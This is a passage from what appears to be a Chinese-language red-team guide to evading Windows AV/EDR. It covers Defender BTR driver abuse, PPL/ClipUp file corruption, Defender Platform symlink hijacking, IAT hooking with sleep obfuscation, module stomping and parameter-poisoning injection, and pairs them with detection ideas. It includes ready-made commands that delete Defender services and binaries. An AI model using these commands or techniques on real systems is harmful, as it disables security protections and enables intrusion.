ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` 流包含一个经过 RC4 加密的 blob。经分析的构建版本重复使用固定的 256 字节密钥，因此加密并非授权边界。有效明文包含一个 24 字节全局头部（`Magic=0xFEE1DEAD`、`Version=2`、`PayloadOffset=0x10`、头部 CRC 和一个根据 payload 生成的事务 ID），其后是一个以 null 终止的 UTF-16 反馈路径和任意数量的项目。每个项目都有一个 16 字节头部（`DataSize`、`Action`、`HeaderCRC`、`DataCRC`），以及以**恰好四个 NUL 字节**结尾的特定操作数据。每个头部/数据区域都会单独使用 CRC-32 多项式 `0xEDB88320`、初始状态 `0xFFFFFFFF` 进行校验，且**不执行最终 XOR**（`~CRC32`）；每个区域都会重置 CRC 状态。<sup>[[36]](#references)[[37]](#references)</sup>

支持的操作 ID 暴露了以下内核原语。<sup>[[36]](#references)[[37]](#references)</sup>

| ID | 项目数据 | 结果 |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | 删除文件，包括被锁定的文件 |
| 2 | `[UTF-16 path]` | 删除空目录 |
| 3 | `[Flags][source][destination]` | 将文件移动到攻击者指定的受保护路径；目标路径为空时表示删除 |
| 4 | `[Flags][key path]` | 递归删除注册表项 |
| 5 | `[Flags][key path + "\\" + value]` | 删除注册表值 |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | 创建/更新注册表值，并创建缺失的键路径 |

对于操作 5 和 6，线上格式中的键/值分隔符是**两个连续的反斜杠**；按常规格式编写的路径无法正确拆分。反馈文件大体上会映射请求内容，但每个项目的前四个数据字节会变成其执行结果 `NTSTATUS`。对于没有前置 flags 字段的操作 1 和 2，BTR 会将路径移入四个保留的尾部字节，以腾出空间存放该状态。<sup>[[36]](#references)</sup>

### `BTR_CLI` 工作流程与早期启动窗口

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) 实现了完整链条：从本地 Defender 提取 `BTR.sys`，创建 `<random>.sys:changelist` 和反馈流，序列化、校验和并加密链式操作，直接创建服务注册表项，然后针对 `-trigger now` 调用 `NtLoadDriver`，或者将其留作系统启动驱动，以使用 `-trigger boot`。直接暂存注册表可绕过常规 SCM `CreateServiceW` 路径，因此**不会**产生服务安装事件 ID 7045。之后可使用 `BTR_CLI.exe -cleanup <service_name>` 移除由启动触发的产物。<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` 不可用，因为 BTR 会在存储堆栈和 `SystemRoot` 链接就绪前，从 `DriverEntry` 执行文件 I/O。`Start=1` 配合高优先级的 `Boot Bus Extender` 组，则会在 Phase 1 执行：此时 NTFS 已可用，但许多系统启动安全驱动和用户模式 EDR 服务尚未初始化。诸如 `WdFilter` 这样的启动筛选驱动可能已经加载，但 BTR 可以在下次启动前移除其二进制文件或服务配置，也可以在 SCM 启动服务可执行文件前将其删除。ELAM 无法弥补这一缺口，因为 BTR 会在启动阶段评估之后运行，且具有有效的 Microsoft 签名。<sup>[[36]](#references)</sup>

多个操作会在一个事务中执行。PoC 会为硬编码路径 `\SystemRoot\Temp\BootClean.log` 添加 Action 1：BTR 创建此日志，随后处理自身的删除请求，并在卸载前将其移除。这能减少痕迹；而将反馈写入 `<random>.sys:<random>.dat`，则可同时移除驱动和两个数据流。<sup>[[36]](#references)[[37]](#references)</sup>

### 高信号检测关联

仅基于签名的规则和 Microsoft 易受攻击驱动程序阻止列表，无法应对对 BTR 预期功能的滥用。建议采用以下行为关联，同时区分合法的 Defender 来源链与任意启动程序。<sup>[[36]](#references)</sup>

- **Sysmon 15：** 创建 `.sys:changelist` 是 BTR 暂存操作的通用特征。若同一个 `.sys` 文件上附加了 `.dat` ADS，则尤其可疑，因为合法的 Defender 通常会将反馈写入 `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` 下。
- **没有 System 7045 的 Sysmon 12/13：** 关联直接创建的 `HKLM\SYSTEM\CurrentControlSet\Services\<random>`，其中包含 `Args=...:changelist` 和 `Group=Boot Bus Extender`，但没有对应的 SCM 安装事件。
- **Sysmon 6 -> 23：** 关联从非 Defender 来源链加载的已知 BTR 驱动，以及随后由 `System`/PID 4 执行的文件删除，尤其是安全软件二进制文件。
- **Sysmon 11 -> 23：** 对 `System`/PID 4 快速创建并删除 `\SystemRoot\Temp\BootClean.log` 发出告警。
- 限制并审计 `SeLoadDriverPrivilege` 的分配与启用；如果安全工具驱动是由 `cmd.exe`、PowerShell 或未知进程暂存的，那么仅有 Microsoft 签名并不足以建立信任。

## 利用 Protected Process Light (PPL) 和 LOLBINs 篡改 AV/EDR

Protected Process Light (PPL) 会实施签名者/级别层级限制，使进程只能篡改同级或更高级别的受保护进程。从攻击角度看，如果你能合法启动启用了 PPL 的二进制文件并控制其参数，就可以将良性功能（例如日志记录）转化为受 PPL 保护的受限写入原语，用于写入 AV/EDR 使用的受保护目录。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

使进程以 PPL 运行的条件
- 目标 EXE（以及任何已加载的 DLL）必须使用支持 PPL 的 EKU 签名。
- 必须使用以下标志，通过 CreateProcess 创建进程：`EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- 必须请求与二进制文件签名者匹配的兼容保护级别（例如，反恶意软件签名者使用 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`，Windows 签名者使用 `PROTECTION_LEVEL_WINDOWS`）。级别不匹配会导致创建失败。

另请参阅此处关于 PP/PPL 和 LSASS 保护的概述：

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

启动程序工具
- 开源辅助工具：CreateProcessAsPPL（选择保护级别并将参数转发给目标 EXE）：
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- 使用模式：

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- 已签名的系统二进制文件 `C:\Windows\System32\ClipUp.exe` 会自行启动，并接受一个参数，将日志文件写入调用者指定的路径。
- 作为 PPL 进程启动时，文件写入操作会由 PPL 执行。
- ClipUp 无法解析包含空格的路径；使用 8.3 短路径指向通常受保护的位置。

8.3 短路径辅助方法
- 列出短名称：在各父目录中运行 `dir /x`。
- 在 cmd 中生成短路径：`for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

滥用链（抽象）
1) 使用启动器（例如 CreateProcessAsPPL），通过 `CREATE_PROTECTED_PROCESS` 启动支持 PPL 的 LOLBIN（ClipUp）。
2) 传入 ClipUp 的日志路径参数，强制在受保护的 AV 目录（例如 Defender Platform）中创建文件。必要时使用 8.3 短名称。
3) 如果 AV 运行时通常会打开/锁定目标二进制文件（例如 MsMpEng.exe），则通过安装一个能可靠地更早运行的自动启动服务，在 AV 启动前于开机时安排写入。使用 Process Monitor（启动日志记录）验证启动顺序。
4) 重启后，PPL 执行的写入会在 AV 锁定其二进制文件之前发生，从而破坏目标文件并阻止 AV 启动。

调用示例（为安全起见，路径已删减/缩短）：

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

说明与限制
- 你无法控制 ClipUp 写入的内容，只能控制写入位置；这种原语适用于破坏，而非精确注入内容。
- 需要本地管理员/SYSTEM 权限才能安装/启动服务，并且需要重启窗口。
- 时机至关重要：目标文件不能处于打开状态；在启动时执行可避免文件锁定。

检测
- 启动前后出现带有异常参数的 `ClipUp.exe` 进程创建事件，尤其是由非标准启动器启动时。
- 新服务被配置为自动启动可疑二进制文件，并且总是在 Defender/AV 之前启动。调查导致 Defender 启动失败的事件发生之前的服务创建/修改操作。
- 对 Defender 二进制文件/Platform 目录进行文件完整性监控；留意带有受保护进程标志的进程意外创建/修改文件。
- ETW/EDR 遥测：查找使用 `CREATE_PROTECTED_PROCESS` 创建的进程，以及非 AV 二进制文件异常使用 PPL 级别的情况。

缓解措施
- WDAC/Code Integrity：限制哪些已签名二进制文件可以作为 PPL 运行，以及允许由哪些父进程启动；阻止在合法场景之外调用 ClipUp。
- 服务管理：限制自动启动服务的创建/修改，并监控启动顺序操纵行为。
- 确保已启用 Defender 防篡改保护和早期启动保护；调查表明二进制文件损坏的启动错误。
- 如果环境兼容，可考虑在托管安全工具的卷上禁用 8.3 短文件名生成（务必进行充分测试）。

## 通过 Platform 版本文件夹符号链接劫持篡改 Microsoft Defender

Windows Defender 会通过枚举以下目录下的子文件夹，选择其运行的平台：
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

它会选择字典序最高的版本字符串对应的子文件夹（例如 `4.18.25070.5-0`），然后从该目录启动 Defender 服务进程（并相应更新服务/注册表路径）。此选择过程会信任目录项，包括目录重解析点（符号链接）。管理员可以利用这一点，将 Defender 重定向到攻击者可写入的路径，从而实现 DLL sideloading 或破坏服务运行。<sup>[[21]](#references)[[22]](#references)</sup>

前提条件
- 本地管理员权限（用于在 Platform 文件夹下创建目录/符号链接）
- 能够重启系统或触发 Defender 重新选择平台（在启动时重启服务）
- 只需使用内置工具（mklink）

原理
- Defender 会阻止对其自身文件夹的写入，但平台选择过程会信任目录项，并选择字典序最高的版本，而不验证目标是否解析到受保护/可信路径。

分步操作（示例）
1) 准备当前平台文件夹的可写克隆，例如 `C:\TMP\AV`：
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) 在 Platform 中创建一个指向你的文件夹的较高版本目录符号链接：
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 触发方式选择（建议重启）：
```cmd
shutdown /r /t 0
```
4) 验证 MsMpEng.exe (WinDefend) 是否从重定向后的路径运行：
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
你应该能在 `C:\TMP\AV\` 下观察到新的进程路径，并看到服务配置/注册表反映该位置。

Post-exploitation 选项
- DLL sideloading/code execution：放置/替换 Defender 从其应用程序目录加载的 DLL，以便在 Defender 进程中执行代码。参见上文：[DLL Sideloading & Proxying](#dll-sideloading--proxying)。
- Service kill/denial：移除版本符号链接，这样下次启动时，配置的路径将无法解析，导致 Defender 启动失败：
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> 请注意，此技术本身无法实现权限提升；它需要管理员权限。

## 使用 PIC 进行 API/IAT Hooking + Call-Stack Spoofing（Crystal Kit 风格）

红队可以将运行时规避从 C2 implant 转移到目标模块本身：Hook 其 Import Address Table (IAT)，并将选定的 API 调用转发到攻击者控制的 position-independent code (PIC)。这样可以将规避能力扩展到许多 kits 暴露的有限 API 范围之外（例如 CreateProcessA），并为 BOFs 和 post-exploitation DLL 提供相同的保护。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

高层方法
- 使用 reflective loader 将 PIC blob 与目标模块一起加载（前置或作为伴随模块）。PIC 必须是自包含且与位置无关的。
- 主机 DLL 加载时，遍历其 IMAGE_IMPORT_DESCRIPTOR，并将目标导入项（例如 CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc）的 IAT 条目修补为指向轻量 PIC wrappers。
- 每个 PIC wrapper 在 tail-call 到真实 API 地址之前执行规避操作。常见规避操作包括：
  - 在调用前后对内存进行遮蔽/取消遮蔽（例如加密 beacon 区域、将 RWX→RX、修改页面名称/权限），然后在调用后恢复。
  - Call-Stack Spoofing：构造一个看似无害的堆栈，并转入目标 API，使 call-stack 分析解析出预期的栈帧。<sup>[[9]](#references)</sup>
- 为确保兼容性，导出一个接口，以便 Aggressor script（或同类工具）能够注册要为 Beacon、BOFs 和 post-ex DLL Hook 的 API。

为何在此处使用 IAT hooking
- 适用于任何使用被 Hook 导入项的代码，无需修改工具代码，也不依赖 Beacon 代理特定 API。
- 覆盖 post-ex DLL：Hook LoadLibrary* 可拦截模块加载（例如 System.Management.Automation.dll、clr.dll），并对这些模块的 API 调用应用相同的内存遮蔽/堆栈规避。
- 通过包装 CreateProcessA/W，让针对基于 call-stack 的检测的进程创建型 post-ex 命令能够可靠运行。

最简 IAT hook 示例（x64 C/C++ 伪代码）
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
说明
- 在重定位/ASLR 之后、首次使用导入项之前应用补丁。TitanLdr/AceLdr 等 Reflective loader 展示了如何在已加载模块的 DllMain 中进行 hooking。
- 保持 wrappers 精简且 PIC-safe；通过打补丁前捕获的原始 IAT 值，或通过 LdrGetProcedureAddress，解析真实 API。
- 对 PIC 使用 RW → RX 转换，避免页面保持可写+可执行状态。

调用栈 spoofing stub
- Draugr 风格的 PIC stub 会构造伪造的调用链（返回地址指向良性模块），然后跳转到真实 API。
- 这能绕过那些期望 Beacon/BOFs 调用敏感 API 时具有规范调用栈的检测。
- 结合 stack cutting/stack stitching 技术，在 API prologue 之前进入预期的栈帧。

操作集成
- 将 reflective loader 放在 post-ex DLL 的开头，使 PIC 和 hooks 在 DLL 加载时自动初始化。
- 使用 Aggressor script 注册目标 API，使 Beacon 和 BOFs 无需修改代码即可透明地使用同一条 evasion 路径。

检测/DFIR 考量
- IAT integrity：条目解析到非 image（heap/anon）地址；定期验证 import pointers。
- Stack anomalies：返回地址不属于已加载的 images；突然跳转到非 image PIC；RtlUserThreadStart ancestry 不一致。
- Loader telemetry：进程内写入 IAT；DllMain 早期活动修改 import thunks；加载时创建意外的 RX 区域。
- Image-load evasion：如果 hooking LoadLibrary*，应监控可疑的 automation/clr assemblies 加载是否与内存 masking 事件相关联。

相关构件和示例
- 在加载期间执行 IAT patching 的 Reflective loaders（例如 TitanLdr、AceLdr）
- Memory masking hooks（例如 simplehook）和 stack-cutting PIC（stackcutting）
- PIC 调用栈 spoofing stubs（例如 Draugr）


## 导入时 IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### 通过驻留 PICO 实现导入时 IAT hooks

如果你控制 reflective loader，可以在 `ProcessImports()` **期间** hooking imports：将 loader 的 `GetProcAddress` 指针替换为一个先检查 hooks 的自定义 resolver：<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- 构建一个**驻留 PICO**（持久 PIC 对象），使其在临时 loader PIC 释放自身后仍能存活。
- 导出 `setup_hooks()` 函数，覆盖 loader 的 import resolver（例如 `funcs.GetProcAddress = _GetProcAddress`）。
- 在 `_GetProcAddress` 中跳过 ordinal imports，并使用基于 hash 的 hook 查找，例如 `__resolve_hook(ror13hash(name))`。如果存在 hook，则返回它；否则调用真实的 `GetProcAddress`。
- 在链接时通过 Crystal Palace `addhook "MODULE$Func" "hook"` 条目注册 hook 目标。由于 hook 位于驻留 PICO 内，因此仍然有效。

这样便能实现**导入时 IAT 重定向**，无需在加载 DLL 后 patch 其代码段。

### 目标使用 PEB-walking 时强制生成可 hook 的 imports

只有当函数实际存在于目标的 IAT 中时，导入时 hooks 才会触发。如果模块通过 PEB-walk + hash 解析 APIs（没有 import entry），则强制生成一个真实 import，使 loader 的 `ProcessImports()` 路径能够处理它：

- 将基于 hash 的 export 解析（例如 `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）替换为直接引用，如 `&WaitForSingleObject`。
- 编译器会生成一个 IAT entry，使 reflective loader 解析 imports 时可以拦截该函数。

### 无需 patch `Sleep()` 的 Ekko 风格 sleep/idle obfuscation

不要 patch `Sleep`，而是 hook implant 实际使用的**等待/IPC 原语**（`WaitForSingleObject(Ex)`、`WaitForMultipleObjects`、`ConnectNamedPipe`）。对于长时间等待，用 Ekko 风格的 obfuscation 链包装调用，在 idle 期间加密内存中的 image：<sup>[[31]](#references)[[27]](#references)</sup>

- 使用 `CreateTimerQueueTimer` 调度一系列 callbacks，通过构造好的 `CONTEXT` frames 调用 `NtContinue`。
- 典型链（x64）：将 image 设为 `PAGE_READWRITE` → 使用 `advapi32!SystemFunction032` 对整个映射的 image 进行 RC4 加密 → 执行阻塞等待 → RC4 解密 → 遍历 PE sections **恢复各 section 的权限** → 发出完成信号。
- `RtlCaptureContext` 提供一个模板 `CONTEXT`；将其复制到多个 frames 中，并设置寄存器（`Rip/Rcx/Rdx/R8/R9`）以调用每个步骤。

操作细节：对于长时间等待，返回“success”（例如 `WAIT_OBJECT_0`），让调用方在 image 被 masking 时继续执行。此模式会在 idle 时段将模块隐藏于扫描器，并避开经典的“patched `Sleep()`”特征。

检测思路（基于 telemetry）
- 大量 `CreateTimerQueueTimer` callbacks 指向 `NtContinue`。
- `advapi32!SystemFunction032` 被用于大型、连续且大小与 image 相当的 buffers。
- 大范围 `VirtualProtect` 后跟自定义的逐 section 权限恢复。

### Sleep-obfuscation gadgets 的运行时 CFG 注册

在启用 CFG 的目标上，首次间接跳转到 `jmp [rbx]` 或 `jmp rdi` 这样的函数中段 gadget 时，通常会因该 gadget 不在模块的 CFG metadata 中而导致进程崩溃，并出现 `STATUS_STACK_BUFFER_OVERRUN`。要让 Ekko/Kraken 风格的链在加固进程中持续运行：<sup>[[30]](#references)</sup>

- 使用 `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` 注册链中使用的每个间接目标，并提供 `CFG_CALL_TARGET_VALID` entries。
- 对于已加载 images（`ntdll`、`kernel32`、`advapi32`）中的地址，`MEMORY_RANGE_ENTRY` 必须从 **image base** 开始，并覆盖 **整个 image size**。
- 对于手动映射/PIC/stomped 区域，则改用 **allocation base** 和 allocation size。
- 不仅要标记 dispatch gadget，还要标记间接到达的 exports（`NtContinue`、`SystemFunction032`、`VirtualProtect`、`GetThreadContext`、`SetThreadContext`、wait/event syscalls），以及任何将成为间接目标的攻击者控制的可执行 sections。

这能将 ROP/JOP 风格的 sleep chains 从“只在非 CFG 进程中有效”变为可在 `explorer.exe`、浏览器、`svchost.exe` 及其他使用 `/guard:cf` 编译的端点上复用的原语。

### 面向休眠线程的 CET-safe stack spoofing

完整替换 `CONTEXT` 会产生明显特征，而且在 CET Shadow Stack 系统上可能失效，因为伪造的 `Rip` 仍必须与硬件 shadow stack 一致。更安全的 sleep-masking 模式如下：<sup>[[30]](#references)</sup>

- 选择同一进程中的另一个线程，并通过 `NtQueryInformationThread` 读取其 `NT_TIB` / TEB stack bounds（`StackBase`、`StackLimit`）。
- 备份当前线程真实的 TEB/TIB。
- 使用 `GetThreadContext` 捕获真实的休眠 context。
- **仅**将真实的 `Rip` 复制到 spoof context，保留伪造的 `Rsp`/stack state。
- 在 sleep window 期间，将 spoof thread 的 `NT_TIB` 复制到当前 TEB，使 stack walkers 在合法的 stack range 内进行 unwind。
- 等待完成后，恢复原始 TIB 和 thread context。

这能保留与 CET 一致的 instruction pointer，同时误导那些依赖 TEB stack metadata 验证 unwind 的 EDR stack walkers。

### 备选方案：基于 APC 的 Kraken Mask

如果 timer-queue dispatch 的特征过于明显，可以通过挂起的 helper thread 使用 queued APCs 执行相同的 sleep-encrypt-spoof-restore 序列：<sup>[[27]](#references)</sup>

- 创建一个以 `NtTestAlert` 为 entrypoint 的 helper thread。
- 使用 `NtQueueApcThread` 将准备好的 `CONTEXT` frames/APCs 入队，并通过 `NtAlertResumeThread` 执行它们。
- 将 chain state 存储在 heap，而非 helper stack，以避免耗尽默认的 64 KB thread stack。
- 使用 `NtSignalAndWaitForSingleObject` 原子地发出 start event 信号并阻塞。
- 在恢复 TIB/context 前挂起 main thread（`NtSuspendThread` → restore → `NtResumeThread`），缩小扫描器可能捕获到栈只恢复了一部分的 race window。

这种方式将 `CreateTimerQueueTimer` + `NtContinue` 特征替换为 helper-thread/APC 特征，同时保留相同的 RC4 masking 和 stack-spoofing 目标。

其他检测思路
- 在 sleep、wait 或 APC dispatch 前不久调用 `NtSetInformationVirtualMemory`，并使用 `VmCfgCallTargetInformation`。
- 在 `WaitForSingleObject(Ex)`、`NtWaitForSingleObject`、`NtSignalAndWaitForSingleObject` 或 `ConnectNamedPipe` 周围调用 `GetThreadContext`/`SetThreadContext`。
- 调用 `NtQueryInformationThread` 后，直接写入当前线程 TEB/TIB 的 stack bounds。
- `NtQueueApcThread`/`NtAlertResumeThread` 链间接调用 `SystemFunction032`、`VirtualProtect` 或 section-permission restoration helpers。
- 在已签名模块内反复使用 `FF 23`（`jmp [rbx]`）或 `FF E7`（`jmp rdi`）等短 gadget signatures 作为 dispatch pivots。


## 精确 Module Stomping

Module stomping 会从**已映射到目标进程中的 DLL 的 `.text` section**执行 payload，而不是分配明显的私有可执行内存或加载新的 sacrificial DLL。覆盖目标应是一个**已加载、由磁盘支持的 image**，其代码空间能够容纳 payload，且不会破坏进程仍需使用的代码路径。<sup>[[1]](#references)[[2]](#references)</sup>

### 可靠的目标选择

针对 `uxtheme.dll` 或 `comctl32.dll` 等常见模块进行简单的 stomping 很不可靠：该 DLL 可能尚未加载到远程进程中，代码区域过小也会导致进程崩溃。更可靠的工作流程是：

1. 枚举目标进程的模块，并保留一个仅包含已加载 DLL 名称的 include list。
2. 先构建 payload，并记录其**精确字节大小**。
3. 扫描磁盘上的候选 DLL，并将 PE section **`.text` 的 `Misc_VirtualSize`** 与 payload 大小进行比较。这比文件大小更重要，因为它反映了可执行 section **映射到内存时**的大小。
4. 解析 **Export Address Table (EAT)**，选择一个导出函数 RVA 作为 stomp 起始偏移。
5. 计算**影响范围**：如果 payload 超过所选函数的边界，就会覆盖内存中位于其后的相邻 exports。

实际中常见的侦察/选择辅助工具：

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- 优先使用远程进程中**已加载**的 DLL，以避免 `LoadLibrary`/意外加载映像产生的遥测数据。
- 优先选择目标应用很少执行的导出函数，否则在线程创建前后，正常代码路径可能会命中被 stomp 的字节。
- 对于较大的 implant，通常需要将 shellcode 的嵌入方式从字符串字面量改为**字节数组/带花括号的初始化器**，这样才能在 injector 源码中正确表示完整缓冲区。

Detection ideas
- 远程写入**由映像文件支持的可执行页面**（`MEM_IMAGE`、`PAGE_EXECUTE*`），而不是更常见的私有 RWX/RX 分配。
- 内存中的导出函数入口点字节与磁盘上的后备文件不再匹配。
- 远程线程或上下文跳转从合法 DLL 导出函数内开始执行，而该导出函数的首字节最近刚被修改。
- 对 DLL `.text` 页面执行可疑的 `VirtualProtect(Ex)` / `WriteProcessMemory` 操作序列，随后创建线程。

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) 是一种**进程注入 / EDR 规避**技术，可避开经典的远程写入路径（`VirtualAllocEx` + `WriteProcessMemory`）。它不将字节复制到已运行的目标进程中，而是利用 Windows **会将选定的 `CreateProcessW` 启动参数复制到子进程**这一特性，并将其存储在 `PEB->ProcessParameters`（`RTL_USER_PROCESS_PARAMETERS`）中。<sup>[[28]](#references)[[29]](#references)</sup>

### 可被 `CreateProcessW` 复制的可投毒载体

可用的载体包括：

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment`（搭配 `CREATE_UNICODE_ENVIRONMENT`）→ `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

载体的实际限制：

- `lpCommandLine` 必须指向**可写内存**，供 `CreateProcessW` 使用；长度上限为 **32,767 个 Unicode 字符**，包括 null 终止符。
- `lpEnvironment` 必须是 Unicode 环境块，由连续的 `NAME=VALUE\0` 字符串组成，并以额外的 `\0` 终止。
- `lpReserved` 官方保留，因此应将 `ShellInfo` 映射视为实现细节，而不是稳定的文档化约定。

这样，正常的进程创建就成了**payload 传输原语**。操作者使用攻击者控制的启动数据创建子进程，再由 Windows 执行跨进程复制。

### 不使用远程写入 API 的远程查找流程

创建子进程后，使用**只读**原语解析复制后的缓冲区：

1. `NtQueryInformationProcess(ProcessBasicInformation)` → 获取 `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. 读取远程 `PEB`
3. 跟随 `PEB.ProcessParameters`
4. 读取 `RTL_USER_PROCESS_PARAMETERS`
5. 使用选定的指针：
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

最简流程：

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### 执行复制的参数缓冲区

复制的参数区域通常是 `RW`，不可执行。常见的 P3 链如下：

1. 正常创建进程（不挂起）
2. 使用 `NtProtectVirtualMemory` / `VirtualProtectEx` 将选定的参数页设为可执行
3. 重用 `PROCESS_INFORMATION` 中已返回的主线程句柄
4. 使用 `NtSetContextThread` 重定向执行（`CONTEXT_CONTROL`，覆盖 `RIP`）

与经典的 thread hijacking 工作流不同，这**不需要** `SuspendThread` / `ResumeThread`；可以直接通过已返回的主线程句柄更改上下文。

这样可以避开注入监控中常见的多个 API：

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- 通常也包括 `SuspendThread` / `ResumeThread`

### Null 字节限制与分阶段 shellcode

这三种载体都是**字符串或类似字符串的数据**，因此包含 `0x00` 的原始 payload 会在传输过程中被截断。一种实用的解决方法是使用**无 null 字节的第一阶段**，在运行时重建常量，然后加载任意的第二阶段。

一种简单的模式是基于 XOR 的常量合成：

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

This lets the first stage build stack strings, API arguments, DLL paths, or a second-stage shellcode loader without embedding null bytes in the transported parameter.

### 来自第一阶段的基于栈的 API 调用

当第一阶段必须调用 `LoadLibraryA` 等 API 时，可以：

- 将字符串/缓冲区压入目标进程的栈
- 预留 **32-byte x64 shadow space**
- 将 `RCX`、`RDX`、`R8`、`R9` 设为常量或相对于 `RSP` 的指针
- 在调用前保持 `RSP` **按 16-byte 对齐**

随后，第二阶段可以从栈复制到 `PAGE_READWRITE` 内存分配区域，再通过 `VirtualProtect` 将其权限改为 `PAGE_EXECUTE_READ` 并跳转过去，从而避免直接分配 RWX 内存。

### 检测思路

作者提到的有效检测机会：

- `VirtualProtectEx` / `NtProtectVirtualMemory` 将**进程参数页设为可执行**
- 此类保护属性变更后跟随 `SetThreadContext` / `NtSetContextThread`
- 远程读取 `PEB`，随后读取 `RTL_USER_PROCESS_PARAMETERS`
- 创建进程时，`lpCommandLine`、`lpEnvironment` 或 `STARTUPINFO.lpReserved` 的值异常长或熵值异常高

### 注意事项

- P3 是一种**跨进程传输技巧**，本身并不是完整的执行原语：复制的参数仍需更改为可执行权限，并使用执行重定向方法。
- 作者曾考虑 `RtlCreateProcessReflection` / Dirty Vanity，但最终放弃，因为它内部会调用 `NtWriteVirtualMemory` 和 `NtCreateThreadEx` 等可疑原语。

## 控制台 STDIN 管道注入

交互式控制台子进程也可以用作**payload 传输原语**。注入器将子进程的标准输入重定向到管道，并发送一个标记，后跟 shellcode。控制台程序将数据读入自己的私有内存后，注入器会找到该缓冲区，将其设为可执行，并将子线程重定向到该缓冲区。这种方法避免使用 `VirtualAllocEx` 和 `WriteProcessMemory`，但仍属于进程注入，而不是通用的 EDR 绕过方法。<sup>[[41]](#references)</sup>

尽管描述中称其为“named-pipe”，但参考实现调用的是 `CreatePipe`，它创建的是**匿名管道**。Windows 在内部使用唯一命名的管道对象实现匿名管道，但该 PoC 既不选择 `\\.\pipe\<name>` 路径，也不调用 `CreateNamedPipe`。它使用默认安全描述符创建可继承句柄，将读句柄放入 `STARTUPINFO.hStdInput`，设置 `STARTF_USESTDHANDLES`，并在启用句柄继承的情况下启动新的子进程。因此，该 PoC 会启动指定的控制台可执行文件；它不会将管道连接到现有进程。<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### 参考工作流

该实现使用以下调用链：<sup>[[41]](#references)</sup>

1. 为子进程的 `STDIN` 和 `STDOUT` 创建匿名管道对。清除两个父进程端句柄的继承属性，并在创建进程后关闭父进程中的子进程端句柄副本。
2. 使用 `CREATE_NEW_CONSOLE` 启动 `netsh.exe` 或 `nslookup.exe` 等交互式可执行文件。子进程继承重定向后的标准句柄。
